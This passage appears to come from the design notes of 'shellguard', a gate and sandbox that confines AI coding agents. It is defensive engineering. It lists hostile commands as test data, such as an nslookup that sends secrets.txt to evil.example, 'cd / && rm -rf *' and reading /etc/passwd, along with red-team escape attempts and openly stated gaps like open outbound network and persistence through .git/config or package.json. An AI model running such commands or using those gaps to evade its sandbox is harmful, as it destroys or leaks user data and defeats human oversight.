Keys are matched without regard to case, through a new `arg-contains-nocase`
predicate, because git reads them that way: `git config CORE.PAGER x` sets
`core.pager`, and was `confine` while the lower-case spelling was `ask`.

*Read-only means this repository.* `git -C /elsewhere status`, `--git-dir`,
`--work-tree`, `git diff --no-index /etc/passwd x` and `git blame --contents <file>`
read outside the workspace, and the read-only rule no longer allows a path that
points outside it. What remains is `--ext-diff`/`--textconv`, which run programs
named in configuration — covered only in that setting such a configuration asks.

**The gate follows `cd` now (§ 17), with stated edges.** It used to resolve every
relative path against one fixed directory, so `cd / && rm -rf *` was judged like
`rm -rf .` — `confine` for a delete of `/`. What it still does not follow:
program-specific directory options (`tar -C /`, `make -C`, `git -C`), which name
where one program works rather than where the shell is; functions and aliases
inherited from the environment rather than defined in the command; and `~` in an
*argument* after `HOME` is reassigned (a bare `cd` or `cd ~` is handled).

**cgroups are not wired up.** `Profile` carries `max_processes` and
`max_memory_bytes` and on Linux nothing enforces them yet. Fork bombs are caught
by a text rule, which is exactly as weak as it sounds.

**gVisor/Landlock parity is by construction, and only half of it has run.** The
gVisor side is exercised by the parity suite on any host. The Landlock side is a
short loop over `Profile::fs_grants` that type-checks for x86_64 and aarch64
Linux but has never run — there is no Linux host here — and the generated OCI
bundle has never been given to `runsc`. Neither Seatbelt's nor Landlock's
enforcement is compared against gVisor's *behaviour*, only against what each
is told to allow.

**Time-of-check to time-of-use in path classification.** The gate canonicalises
the longest existing ancestor, which catches a symlinked parent. It cannot catch
a symlink created between the decision and the command running. This is not a
bug to fix in the gate — it is why the gate is not the boundary.

**Policy reload is in-process only, and its guard is a tripwire.** The
command-line tool reads its policy fresh each invocation and has no reload; the
`sg_gate_*` C API has none either (only `sg_engine_*`). The weakening check
(§ 15) sees removals, verdict decreases and permissive additions; it cannot see a
rule whose predicates were loosened while its verdict stayed put — those are
listed as `modified` for a human to read. The `policy` audit record is written
after the change and is best-effort even under `--audit-required`. Fingerprints
identify content within a build and are not stable across releases.

## 13. Findings from building it

Things that were wrong and are now not. Recorded because each was found by
running the thing rather than by reading it, which is the argument for the
tests that found them.

| what | how it was found |
|---|---|
| `sed`/`awk` blanket-allowed despite `sed -i` and `awk '{print > "f"}'` | writing the corpus |
| `device.format` named `mkfs`, missing `mkfs.ext4` and every real invocation | writing the corpus |
| a rule denying `>>` under a reason saying "truncates" | writing the corpus |
| `--workspace` did not imply the working directory, so `rm -rf ./build` was denied | writing the README |
| `fs.write` granted the **shared** `/tmp`, a standard pivot | a runtime test |
| macOS profile made paths writable but not readable, so `echo x > f; cat f` failed | a runtime test |
| a command matching no rule could not write in its own workspace | an engine test |
| `validate()` used a fixed temp filename — a race and a symlink surface | parallel test execution |
| macOS `python3`/`git` re-exec through `xcrun` into an unreadable `/Library/Developer` | the Python harness |
| `prctl` declared twice with conflicting signatures; one would truncate a pointer | clippy |
| inline `python3 -c` escalated to a human when the sandbox already contained it | the Python harness |
| a "60 concurrent processes" log test passed without ever rotating (default threshold 8 MiB), so it proved less than it claimed | reading the file sizes in its own output |
| test helpers for the log and the repo resolved to one directory, so creating the log deleted the repository under test | an engine test finding `tracked.txt` missing |
| "stdout is not recorded" asserted against a string the command text itself contains, which is (correctly) recorded | the test failing on the wrong thing |
| a tamper test that only let the gate refuse the command said nothing about the kernel | asking which layer had stopped it |
| `shellguard run` silently ignored `--policy` while `eval` honoured it | reading `cmd_run` while designing reload |
| an unknown program was laundered from `confine` to `allow` by any allowed neighbour (`tool; ls`), and `nslookup $(cat secrets.txt).evil.example` came back `allow` | asking what the gate said about the exfiltration commands I was about to classify |
| `git remote add` and `set-url` were `allow` as "read-only inspection" | a corpus expectation I got wrong |
| an unexplained test flake was the gate's own 10 ms deadline firing on a busy machine; the default was a second copy of the constant nothing read | repeating 414 identical evaluations and printing the reason |
| a network probe "proved" the sandbox blocked TCP while nothing was listening (the listener had crashed) | printing what the listeners received, and adding an unsandboxed control |
| `open -a NoSuchApp` "showed" the sandbox reached LaunchServices; it resolves app names locally and answers the same either way | the deny I tried changed nothing, and broke `git` |
| a benchmark on a machine at load average 176 showed a 200× regression that was not there | "parse only" got slower too, and I had not touched the parser |
| Landlock handled both TCP rights unless the profile could listen, so a profile granted `net.connect` had connect denied on ABI 4+ | reading `landlock.rs` to find out what "no network" meant on Linux |
| gVisor mounted the workspace writable for a profile that granted no writes, under a test named "only the workspace is writable" that never checked `rw` against `ro` | writing the parity test first and watching it fail |
| a policy block pasted twice was accepted by the parser and double-reported every match | a unit test, not the parser |
| a "did not run" assertion searched stdout for text the refusal message itself prints | the test failing on the wrong thing |
| a multi-workspace test assumed two engine handles when handles are created lazily | the test failing |
| a test built a C string containing NUL, which a C string cannot | the test failing to construct its input |
| `cd / && rm -rf *` was `confine`: every relative path was resolved against one fixed directory | asking where `rm -rf *` would land after a `cd` |
| `rm -rf link/../x` was resolved textually to `./x`; the kernel resolves `link` first, so it is a sibling of the link's *target* | building the symlink fixture for `cd`, and reading the file back through the path |
| `sudo -D / rm -rf x` unwrapped to a program named `/`, so the `rm` was never judged | adding `-D` as a directory option and finding it was not known to take a value |
| zsh 5.9 runs the first command of `cd / && x &` in the current shell, not the background job | the real-shell test, on its first run |
| three test fixtures shared one directory and deleted it under each other | `getcwd: cannot access parent directories` from a shell mid-test |
| two mutants of the `cd` model survived: every script followed an `if` with `;`, which merges both outcomes, and nothing reset the state after an alias | mutation testing |
| following `cd` first cost 1.7 µs a command, mostly re-deciding per evaluation where the shell *starts* | an A/B benchmark with only the gate's source swapped |
| `shellguard profile` rebuilt the profile on its own, skipped the step that makes the workspace writable for `confine`, and left out the per-run scratch directory — it showed a read-only workspace for commands `run` let write | using its output as the baseline for the Mach-service experiments (§ 6.1): tools that `run` ran fine failed under the printed profile |
| `git -C dir reset --hard` and `git -c x=y clean -fdx` were `confine`: the value of a global option was taken for the subcommand, and a unit test asserted that as correct | trying `git -C` while scoping the program-level `-C` options |
| `git config CORE.PAGER x` sets `core.pager`, and was `confine` while the lower-case spelling was `ask` | reading git's documentation on key names after the `-C` finding, then running it |
| the C API resolved relative paths against the *host process's* directory, not the workspace; every other caller set it by hand | the FFI tests failing once the read-only git rule began refusing paths outside the workspace |
| `tar -xf x.tar -C /`, `cp tool /usr/local/bin/`, `truncate -s 0 ~/notes` were `confine`: only the shell's own writes (redirects) were judged by destination | measuring what the gate said about program-level `-C` options |
| resolving symlinks for the system-path check refused `cp tool ~/bin/` for a home under macOS's `/home`, which leads into `/System/Volumes/Data` | the corpus test, whose home is `/home/agent`, disagreeing with the CLI's |
| `Option::is_none_or` is newer than the project's minimum Rust version | clippy's MSRV lint |
| git accepts unambiguous abbreviations of long options: `git branch --del x` and `--d x` delete, so a rule listing `--delete` misses them | running git to find out what "read-only" meant, instead of reading its manual |
| `git log`/`diff`/`show`/`shortlog --output=<file>` writes a file, and was `allow` under a rule called read-only inspection | checking the *other* subcommands of the rule I was fixing |
| a spec line `--format=%(refname:short)` was an unquoted-parenthesis syntax error, so the gate correctly said `deny` and git errored too | the two halves of the test disagreeing about the same line |
| a probe of `git shortlog` hung: it reads stdin when it is not a terminal | the background task never finishing |
| an SBPL `(allow mach-lookup` block with an empty filter list is the blanket allow, so an allowlist that came out empty would have silently become the rule it replaced | a mutation that emptied the list passed the real-tool test; asking the kernel showed `SecurityServer` reachable |
| a helper that found the end of the `mach-lookup` block stopped at the first entry, so the "exactly these services" test passed vacuously for the one-entry profile | the same test failing for the two-entry (network) profile |

The `git stash create` correction in § 7 belongs here too: the first draft of
this document asserted it mutates the working tree. Measuring it showed
otherwise.

## 14. The audit log

`--audit FILE` (CLI), `sg_engine_set_audit` (C ABI) and `audit_log=` (Python)
attach an append-only record of what was judged, what ran, and what was undone.
The implementation is `audit.rs` and `redact.rs` in `shellguard-runtime`.

**Why it exists.** A rolled-back command leaves no trace on disk by design, so
without a record the only evidence a defence worked is the absence of damage —
which is also what a defence that never fired looks like.

**What is written.** One JSON object per line:

| `kind` | when |
|---|---|
| `header` | first line of every file, including after rotation |
| `evaluate` | a command was judged and not asked to run |
| `refused` | a command was submitted to run and the gate stopped it |
| `start` | a command is about to run — before the checkpoint |
| `finish` | that command ended (same `id` as its `start`) |
| `error` | that command could not be run to completion (same `id`) |

Execution is two records, not one, for a reason. A process that dies mid-command
never writes its `finish`, and a `start` with no matching `finish` is the trace
such a death should leave. It is also what gives `--audit-required` meaning: the
record that must succeed is the one written *before* the command runs.

**What is deliberately not written.**

- Output, unless `--audit-verbose`. Output is where credentials most often
  appear.
- The environment, ever.
- Anything derived from the command text, un-redacted. `redact.rs` recognises
  prefixed tokens (AWS, GitHub, Slack, Stripe, OpenAI/Anthropic-style, JWTs),
  `key=value` / `"key": "value"` / `--flag value` pairs with sensitive names,
  `Authorization` and cookie headers, `Bearer` tokens, `user:password@` in URLs,
  and PEM private-key blocks. It is **best-effort**: a bare high-entropy string
  with no recognisable prefix and no telling name beside it passes through,
  because git hashes look identical and a log where every hash is `[REDACTED]`
  is unreadable. Over-redaction is the accepted failure mode. Redaction runs
  *before* truncation, so a token cannot be cut in half and slip past the
  patterns.

**Integrity.** The writer is the supervisor, outside the sandbox — the same
reason the macOS runtime confines a child rather than the current process. The
file is created `0600`; an existing file that is group- or world-writable is
refused; a symlinked path is refused (a check-then-open, so it stops the
accident and the lazy attack, not a determined local one). A command cannot
write into its own log, and that is held by two independent layers, each
exercised on its own: by default the gate escalates the write (`fs.append-outside`),
and when forced past the gate (`run_on_ask`) the kernel returns `EPERM`.

It is **not tamper-evident**: there is no hash chain and no signature, so
another process running as the same user, outside the sandbox, can rewrite it.

**Concurrency and growth.** Each CLI invocation is its own process, so
in-process locking is not enough. Every write takes an `flock` on a sidecar
file, checks the size, rotates if needed, and appends the whole line in one
`write`. Rotation is by size (`audit.jsonl` → `.1` → … → `.N`), and each new file
starts with a header. Verified with 60 separate processes and rotation forced
mid-run: 3 files, 60 of 60 records, one header per file, nothing lost, repeated
or torn. Records are bounded (fields are capped on their *escaped* length, never
mid-escape), so a record cannot exceed the file.

**Failure is never silent.** Failing to *open* the log is always an error.
Failing to *write* is counted (`sg_engine_audit_failures`,
`SandboxEngine.audit_failures`) and reported on the run (`audit_error`, and on
stderr from the CLI). Whether it also stops the command is a choice:

| | a write fails | exit |
|---|---|---|
| default | the command still runs; the failure is reported | — |
| `--audit-required` | the command does not run | 65 |

The default is best-effort because a full disk should not make every command
fail; `required` is for when an unaudited command is worse than a refused one.

**Cost.** Measured through the Python binding on the release library, 3,000
judgments: p50 53 µs without a log, 112 µs with one (+59 µs); p99 255 µs. About
1% of the 10 ms budget. The price is a lock, an open and a write per record,
paid so that concurrent processes cannot corrupt each other.

**What it cannot tell you.** Only commands submitted to an engine holding the
log appear in it. A command run any other way is invisible, and a quiet log is
not evidence of a quiet agent. Each file's header carries a `coverage` field
saying so, so the caveat travels with the data.

## 15. Reloading the policy

`Engine::reload_policy` (Rust), `sg_engine_reload_policy` (C ABI) and
`SandboxEngine.reload_policy` (Python) replace the ruleset of a running engine.
The implementation is `reload.rs` in `shellguard-gate`.

**Why it needs care.** A policy that was a constant for the life of the process
was friction and also a checkpoint. Reload removes the friction, which is the
point; the design is about not removing the checkpoint with it.

**Atomic.** The policy sits behind `RwLock<Arc<CompiledPolicy>>` (std only; the
zero-dependency rule holds). An evaluation takes one snapshot at its start and
uses it throughout, so a command is judged entirely by the old rules or entirely
by the new ones, and one already in flight finishes against the rules it started
with. Verified with evaluators racing 3,000 reloads: every decision's fingerprint
and verdict agree. Re-reading the policy mid-evaluation — the obvious bug — fails
that test in 6 of 6 runs.

**A bad file never replaces a good policy.** Text is parsed and compiled in full
before anything is touched; any error leaves the previous policy in force. This
holds even when weakening is allowed: permission to loosen is not permission to
be invalid. The parser also now rejects duplicate rule ids, which had got into the
built-in policy once already and which no unit test stands guard against in a
live reload.

**A file that parses can still be worse.** A half-written save is a prefix of the
file, and a prefix cut between two rules is a valid, smaller policy. So a reload
is diffed against what it replaces, and one that lowers protection is refused
unless the caller passes `allow_weakening`. Weakening means: removing a rule that
restricted something, lowering a rule's verdict, lowering the default, or adding
a rule more permissive than the default (a matching `allow` rule *replaces* the
default rather than joining it, so this genuinely lowers scrutiny). The property
is tested on the real policy by cutting it at every line: every cut inside a rule
fails to parse, and every cut between rules that dropped a restriction is flagged.

It is a **tripwire, not a proof.** It cannot see a rule whose predicates were
loosened while its verdict stayed the same; those appear as `modified` in the
report for a human to read. The check is against what is *in force*, not what was
first loaded, so returning to the original after strengthening is itself a
weakening.

**Explicit, and text not a path.** There is no file watcher: a watcher reacts to
a save in progress, which is the failure being avoided, and it turns "who changed
the rules" into a question about the filesystem. The API takes the policy *text*,
so an embedding application decides what was reviewed and there is no gap between
checking a file and reading it. There is no path parameter anywhere.

**Traceable.** Every decision carries a `policy` fingerprint (FNV-1a over the
rules' canonical form; 16 hex digits), and every reload — applied or refused — is
a `policy` record in the audit log with the SHA-256 of the text offered, the
fingerprints before and after, and what was added, removed, modified and
weakened. A `start` before a reload and a `refused` after it name different
policies, and the `policy` record between them links the two. Refused reloads are
recorded because someone pushing a malformed or quietly-weakening policy is the
event an audit trail is for.

**Several workspaces.** The Python binding builds one engine handle per workspace,
lazily. A reload is applied to every existing handle and remembered, and replayed
onto any handle created later — otherwise a workspace first used after a reload
would quietly run the built-in rules. The first handle is judged under the
caller's strictness and the rest are replicas of that vetted state, so a refusal
can only come before anything has changed.

**Cost.** One `Arc` clone and a read lock per judgment. Measured A/B against the
commit before, alternating runs: p50 2.7–2.9 µs on both, p99 12–15 µs on both.
Within noise.

## 16. What stops a command from sending data out

Rollback restores local files. It cannot recall a secret that has already left the
machine, so for a command that could send data somewhere the only lever is that it
never gets the network. `tests/exfiltration.txt` writes that down, and
`crates/shellguard-runtime/tests/exfiltration.rs` checks it.

**Three classes, because three different things can be responsible.**

| class | what stops it | asserted |
|---|---|---|
| `blocked` | the gate: verdict `ask` or `deny`, so it never runs unattended | verdict ≥ `ask` |
| `granted` | nothing — it legitimately needs the network, and *says so* | the decision names a network capability |
| `sandbox` | the kernel alone — the gate does not see any network use | verdict `allow`/`confine`, no network capability |

`sandbox` is the honest list of what the gate cannot see (`ssh`, `scp`, `git push`,
`ping`, `nslookup`, an interpreter one-liner…). If a rule later learns to recognise
one, moving it is progress — and the test fails until someone does it on purpose.

**Checked, in increasing order of how far it can be trusted.**

1. *Classification* — every command lands in its class.
2. *No implicit network* — for every command, the profile the engine builds has
   network **if and only if** the decision names a network capability. Network
   cannot arrive by any route that does not show in the record.
3. *Containment against the real kernel* — the `sandbox` commands that aim at a
   loopback listener (TCP, UDP, a Unix socket in the workspace) are actually run.
   Each is first run **unsandboxed as a control**; if the control cannot reach the
   listener the command proves nothing and is excluded (`busybox`, `php` and
   macOS's non-GNU `awk` are, here). Then it is run sandboxed, and nothing may
   arrive. A second control shows a profile *with* network does reach all three
   listeners, so silence under no grant means something.

**What was verified on macOS, with controls:** with no network grant, TCP,
UDP and Unix-socket connections are refused, and hostnames do not resolve through
`getaddrinfo`, `dscacheutil` or `dns-sd`. The last is worth a sentence: while the
profile allowed every `mach-lookup` the resolver was reachable at the Mach level, yet
`dns-sd` reported `Service Not Running` — consistent with `libsystem_dnssd` talking
to `mDNSResponder` over a Unix socket, which is refused with the rest. That was an
inference; the measurement is that lookups fail, in 0.01 s against 0.05 s for a
genuine NXDOMAIN from an unsandboxed process. Mach lookups are now refused as well
(§ 6.1) and the DNS test still passes; I did not separate which of the two layers
now produces the failure. With the sandbox deliberately opened,
the harness catches it: 6 sandboxed commands reached the listeners and a hostname
resolved.

**Mach services** (`privileged_system_services_are_not_reachable_from_the_sandbox`,
`a_network_grant_does_not_open_the_services_that_act_on_the_users_behalf`): a probe
inside the sandbox asks the bootstrap server for eight services and the test asserts
the reachable set *equals* the granted set — `libinfo` alone offline, plus
`TrustEvaluationAgent` with a network grant — and that none of the four is in it. The
probe launches, opens and reads nothing. A third test, `--ignored` because it needs
the internet, completes a real HTTPS request under the network grant; with
`TrustEvaluationAgent` removed it fails, which is what justifies the entry.

**What was not:** everything in § 12's Linux paragraph. The list of channels tried is
not a proof there are no others.

**The default was not applied per command.** Writing the `sandbox` class meant
asking the gate about `nslookup $(cat secrets.txt).evil.example.com`, and it said
`allow`. The policy default (`confine`) applied only if *no* command on the line
matched any rule; `cat` matched an allow rule, so the unknown `nslookup` was never
asked. The same held for `unknown-tool; ls`, `unknown-tool | cat`, and anything
beside a `$(cat …)`. Since `allow` means "run directly", a harness using the gate
alone would have run whatever the agent put before the `;` with no sandbox. It now
applies to each command that executes something and matched no rule:

- A **wrapper** (`timeout`, `sudo`, `bash -c`, `find -exec`) is exempt, because it is
  judged through what it wraps; the wrapped command is not.
- A **program-less assignment** (`FOO=bar`) executes nothing and is exempt. A
  computed program (`$CMD args`) executes something unknowable and is not.
- When some other command matched, the defaulted command gets a `policy.default`
  finding, so the verdict explains itself. Alone, findings stay empty as before.
- Shell builtins that only move around or test (`cd`, `pushd`, `popd`, `test`, `[`,
  `:`) are on a new allow list so `cd src && ls` stays `allow`. `export`, `umask`,
  `set`, `source`, `eval`, `exec`, `trap` and `alias` are deliberately not on it.

Measured on 69 realistic compound commands: none moved towards `allow`, and 10
moved from `allow` to `confine` — the target itself, five with `$(…)` in their
arguments (the allow rules decline unresolved paths, and a harmless inner command
had been masking that), and `cd ..`, `find`, `umask`, `cargo --version`. No latency
cost (A/B on a quiet machine: p50 2.6–2.7 µs against 2.7–2.8 µs; adversarial worst
case about 2.1 ms on both).

**Also found and fixed on the way:** `safe.vcs-inspection` allowed `git remote add`
and `set-url`, which configure where a later push goes; and the Landlock ruleset
handled both TCP rights unless the profile could listen, so a profile granted
`net.connect` had connect *denied* on kernels with ABI 4+. The second is a pure
decision and now lives in `landlock_abi.rs`, which compiles everywhere and is
tested here; the Linux code that calls it type-checks for both architectures and
has never run.

## 17. Following `cd`

Every rule about where a path points is only as good as the directory a
relative path is resolved against. The gate used to use one fixed directory, so
`cd / && rm -rf *` was judged exactly like `rm -rf .`.

**What the gate knows is a set.** It does not run the shell, so it cannot know
which directory the shell is in; it knows every directory the shell *could* be
in at each command, or that it cannot bound it. A path is outside the workspace
if it is outside from any directory in the set, and unresolved if the set is
unknown — the same answer `rm -rf $DIR` already got. Once the shell may be
outside the workspace, a bare name (`build`, `*`) counts as a path, because it
now names something outside.

**Two sets, because `&&` and `||` choose.** The collector carries where the
shell may be if the last thing succeeded and if it failed. After `cd /tmp && x`,
`x` runs only in `/tmp`; after `cd /tmp || x`, only where the shell already was;
after `cd /tmp; x`, in either; `(cd /)`, `$(cd /)` and `cd / &` move nothing.
`if`, `case`, pipelines, `pushd`/`popd` and `cd -` are tracked the same way.

| before | after | why |
|---|---|---|
| `cd / && rm -rf *` `confine` | `deny` | `*` is `/`'s entries |
| `cd .. && rm -rf *` `confine` | `deny` | outside the workspace |
| `cd /tmp && echo x > out.txt` `confine` | `deny` | truncates `/tmp/out.txt` |
| `env -C / rm -rf home`, `sudo -D / …` `confine` | `deny` | the wrapper `chdir`s first |
| `cd $DIR && rm -rf build` `confine` | `ask` | `build` could be anywhere |
| `cd src && rm -rf build` `confine` | `confine` | unchanged: still inside |
| `cd /tmp || rm -rf build` `confine` | `confine` | `rm` runs only if `cd` failed |

**Measured before it was modelled.** Probing `sh`, `bash`, `zsh` and `dash` on
this machine settled what reading the manuals would have guessed at:

- `cd` is *logical* — `cd link && cd ..` goes back — but the kernel resolves a
  relative path *physically*: after `cd link`, `rm ../x` deletes a sibling of the
  link's target. So the set holds directories as `cd` spells them, arguments are
  resolved from where the directory really is, and where the two readings of a
  `cd` are different directories (`set -P` changes which one `cd` means) both go
  in the set.
- With `CDPATH` exported, `cd src` goes to `$CDPATH/src` even when `./src`
  exists. It is read from the gate's environment.
- `zsh` keeps a `cd` made in the last stage of a pipeline; the others do not.
  And `zsh` 5.9 runs the *first* command of `cd / && x &` in the current shell.
- An alias defined on one line is a `cd` on the next, even in `sh -c`; `trap
  'cd /' DEBUG` runs before every later command; `c=cd; $c /` is a `cd`; a
  function that calls `cd` moves its caller; `declare "HO"ME=/` changes where a
  bare `cd` goes. None of these can be followed without running the shell, so
  each makes the directory unknown from that point on — it does not guess.

**How it is checked.** Not against the model's author: against the shells.
`every_directory_a_real_shell_was_in_is_one_the_gate_considered` runs about 90
scripts — every construct above and its edges — under all four shells, with
marks that record `pwd -P`, and requires every directory a shell really was in
to be in the gate's set (about 400 marks, over 70% of them with a known set, so
"unknown" is not doing the work). A second test pins the *exact* set for what
agents write, so the model cannot get sound by getting lazy. The first run found
the `zsh` background case. 23 mutants of the model's rules are each caught; two
survived the first round and each exposed a gap in the tests, not the code.

**Cost.** Median evaluation 3.0 → 3.3 µs, mean 3.8 → 4.3 µs, worst adversarial
case unchanged at about 2.2 ms (A/B, alternating builds, same 212 commands, only
the gate's source swapped). The first version cost 1.7 µs a command; the
difference was deciding, on every evaluation, whether the shell's starting
directory is inside the workspace — now worked out once per configuration.

## 18. Where a program writes

A redirect is the shell writing on a command's behalf, and the gate has always
judged those: `> /etc/x` is refused, `>> ~/x` asks. A program writing to a path it
was *given* is the other half, and was invisible. `tar -xf x.tar -C /` extracts into
`/`, `cp tool /usr/local/bin/` overwrites a system file, `truncate -s 0 ~/notes`
empties one — all `confine`, judged no differently from a write inside the workspace.

**Which argument is the destination is the program's business**, so it is written
down per program in `src/writes.rs`, as `unwrap.rs` writes down each wrapper's
options: the last operand or `-t` for `cp`, `mv`, `install`, `ln`, `rsync` and
`ditto`; the directory `tar -x` extracts into (`-C`, or where it runs) and the
archive `tar -c` creates; `unzip -d`; what `patch` changes; every file `tee` and
`truncate` name. Each program's options that take a value are listed too, because
getting that wrong is the dangerous failure: `rsync -a src/ dst/ --exclude .git`
would otherwise take `.git` for the destination. The policy then asks two things,
through two new directives: `writes-outside` and `writes-under <dirs>`.

**The verdicts were a decision, and the user made it:** mirror the redirect rules. A
path the system owns is refused; truncating outside is refused because it destroys
what was there; any other write outside the workspace asks, because
`cp tool ~/bin/` is often exactly what the person wants. "Under" includes "above":
extracting into `/` or `/usr` can land files in `/etc` as surely as extracting into
`/etc`.

**The system-path check reads the path as the shell names it.** `cd / && tar -x`
writes `.`, which is `/` — so destinations also carry their absolute spelling from
every directory the shell may be in (§ 17). An earlier version resolved symlinks for
this, and on macOS `/home` is a symlink into `/System/Volumes/Data/home`, so
`cp tool ~/bin/` for a user whose home is there was refused as a write into
`/System`. That volume is the writable data volume, not the system. The spelling is
now joined and `..`-collapsed with symlinks left alone — the same textual reading
the redirect rule it mirrors uses. Whether a destination is *outside the
workspace* still resolves symlinks.

**Checked against the programs.** `tests/writes.txt` holds about 60 commands in five
classes. Every line that writes locally is run in a scratch fixture with a
directory beside the workspace, which is compared before and after: `ask` and
`truncate` lines must change it, `inside` lines must not (including
`tar -czf out.tgz -C <outside> f`, which *reads* outside and writes inside). 40 lines
run for real here; `cp -t` is GNU's and macOS's `cp` rejects it, so that line's
verdict is checked and its effect reported as unsupported. Eight mutants of the
table and the rules are each caught.

**Not modelled:** `sed -i` (whose `-i` takes an argument on BSD and does not on GNU,
so the operands cannot be told apart reliably), `dd of=` (its own rule), `make
install` and package installs (their own rules); a destination that is not known
before the command runs (`cp x "$OUT"`) is not escalated; and a symlink inside the
workspace that points at a system directory makes a write through it `ask`, not
`deny`, because the system check does not follow links.

## 19. Wrapping a whole agent

Everything before this section judges and confines one command. That protects
nothing an agent does without going through it — its own file-editing tools, a
setting changed, a hook removed (MITIGATIONS #8, #10, #14). The decision, made by the
user against three alternatives, was to confine the **agent itself**: `shellguard
shell -- <agent>` runs it and everything it starts under one Seatbelt profile.

**Why that and not a per-command layer underneath it.** Measured first: on macOS a
sandboxed process cannot apply a different profile — `sandbox-exec` or `sandbox_init`
with anything other than the profile already in force is refused (`sandbox_apply:
Operation not permitted`). So "wrap the agent" and "sandbox each command" cannot both
be kernel-enforced at once on a Mac. The session is the boundary; a test pins the
refusal so it is noticed if a macOS release lifts it.

**The shape is the opposite of a command's** (`AgentProfile`):

| | per command | whole session |
|---|---|---|
| reads | system runtime and the workspace | everything, except 29 places that hold secrets |
| writes | the workspace, if granted | the workspace, the agent's state, a private temp dir |
| network | only if a rule granted it | outbound, and listening on localhost |
| Mach services | an allowlist of two | the same allowlist |

**SBPL precedence, measured** (`sbpl_precedence_is_what_the_profiles_rely_on`): a
rule with a filter beats one without, in either order; among rules with filters the
last match wins. The secret denial therefore beats the open read wherever it stands,
but `.git/hooks` must be frozen *after* the workspace grant — before it, the grant
wins and hooks are writable (a mutant proved it).

**What the real agents needed, found by running them** (with the user's approval, on
their accounts, in a scratch workspace):

- *Codex* loads TLS roots through the Keychain, which a session cannot read; every
  request failed after the TCP connect. With `SSL_CERT_FILE=/etc/ssl/cert.pem` — now
  the session default — the sandboxed run got the same answer from the server as an
  unsandboxed one. `configd` and an `AF_SYSTEM` socket were refused too and turned
  out not to matter.
- *Codex* also sandboxes its own commands with Seatbelt, which cannot nest; inside a
  session it must run with `--sandbox danger-full-access`, and the CLI says so.
- *Claude Code* keeps its login in the Keychain. Reading it needs the Keychain's
  services and files; refreshing an expired token needs to *write* the login
  keychain. The user chose to keep the Keychain sealed and authenticate with
  `CLAUDE_CODE_OAUTH_TOKEN` from `claude setup-token`; the CLI says so when it is
  missing. Claude also writes a version lock under `~/.local/state/claude`, now in its
  preset.

**Closing the other doors.** Sealing secret files while leaving secrets elsewhere
would be sealing one door of two:

- environment variables whose names look like credentials are removed, except the
  agent's own, and the banner names each one removed;
- the SSH agent is unreachable (launchd's socket by pattern, plus whatever
  `SSH_AUTH_SOCK` names) — with `~/.ssh` unreadable it was the remaining way to use
  the keys;
- container daemons' sockets are unreachable (Docker Desktop, OrbStack, Colima, Lima,
  Rancher, Podman, `DOCKER_HOST`): a daemon that will run `-v /:/host` for any client
  is a way out of every rule here, and a socket connect is not a write. The kernel
  checks a socket's *resolved* path, so `/var/run/docker.sock` is blocked by its
  target — and a symlink whose target does not exist yet (the daemon is not running)
  is followed to where the socket will be.

**Red-teamed with a stand-in agent**, each against a canary and with an unsandboxed
control: writes, deletes and renames outside; writes through a hard link and a
symlink; `launchctl submit`; `defaults write` (cfprefsd writes for the client);
`osascript do shell script`; `open` (LaunchServices). All held.

**Not done, and why.** A full real-agent session — the red-team prompt that asks
Claude and Codex, with permissions bypassed, to write and delete outside the
workspace and read a canary marked secret — could not run: both CLI logins on the
test machine were expired (Codex refused even unsandboxed). It is the next thing to
run once they are renewed. Outbound network is open, so a session limits what can be
changed, not what can be sent. Persistence inside the workspace beyond `.git/hooks` —
`.git/config` keys that run programs, `package.json` scripts, a `Makefile`, `.envrc`
— is writable, and runs when the person next uses the project outside a session.
Linux is not built: Landlock grants access and cannot take it back, so a readable home
with unreadable secrets in it cannot be expressed. Claude Code's own sandbox setting,
if enabled, would fail to nest the same way Codex's does.
